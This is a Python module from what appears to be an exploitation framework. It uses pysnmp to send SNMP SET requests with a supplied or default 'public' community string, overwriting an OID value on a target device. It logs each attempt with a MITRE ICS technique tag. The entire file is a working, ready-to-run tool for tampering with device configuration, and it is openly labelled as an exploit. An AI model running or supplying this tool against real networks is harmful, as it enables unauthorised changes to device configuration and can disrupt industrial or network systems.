# modules/exploits/snmp_config_injector.py

import argparse
import json
import os
from datetime import datetime
from pysnmp.hlapi import *

LOG_PATH = "results/exploit_logs.json"
MITRE_TTP = "T0859"  # Modify System Image

def log_injection(entry):
    os.makedirs("results", exist_ok=True)
    if os.path.exists(LOG_PATH):
        with open(LOG_PATH, "r") as f:
            data = json.load(f)
    else:
        data = []
    data.append(entry)
    with open(LOG_PATH, "w") as f:
        json.dump(data, f, indent=2)

def inject_snmp(target_ip, community, oid, value):
    errorIndication, errorStatus, errorIndex, varBinds = next(
        setCmd(SnmpEngine(),
               CommunityData(community, mpModel=0),
               UdpTransportTarget((target_ip, 161)),
               ContextData(),
               ObjectType(ObjectIdentity(oid), OctetString(value)))
    )

    log_injection({
        "timestamp": datetime.utcnow().isoformat(),
        "target_ip": target_ip,
        "community": community,
        "oid": oid,
        "value": value,
        "ttp": MITRE_TTP,
        "success": errorIndication is None
    })

    if errorIndication:
        print(f"[!] SNMP injection failed: {errorIndication}")
    elif errorStatus:
        print(f"[!] SNMP set failed: {errorStatus.prettyPrint()}")
    else:
        print(f"[âœ“] SNMP OID {oid} set to '{value}' on {target_ip}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SNMP Config Injector")
    parser.add_argument("--target", required=True, help="Target IP address")
    parser.add_argument("--community", default="public", help="SNMP community string")
    parser.add_argument("--oid", required=True, help="OID to overwrite (e.g. 1.3.6.1.2.1.1.5.0)")
    parser.add_argument("--value", required=True, help="New value for the OID")
    args = parser.parse_args()

    inject_snmp(args.target, args.community, args.oid, args.value)
